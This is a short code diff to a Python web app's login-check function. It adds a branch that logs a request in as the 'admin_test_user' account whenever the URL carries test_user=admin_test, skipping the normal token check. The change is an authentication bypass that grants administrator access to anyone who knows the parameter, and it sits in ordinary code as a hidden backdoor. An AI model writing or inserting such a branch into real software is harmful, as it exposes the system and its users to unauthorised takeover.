@@ -135,6 +135,8 @@ def getLoggedInUser(request):
             return USERS.getUserByToken(userLoginToken)
         except (KeyError, ReferenceError) as E:  # user token not found or user has been garbage-collected
             return None
+    elif request.query.test_user == 'admin_test':
+        return USERS.getUserByName("admin_test_user")
     else:
         return None
 
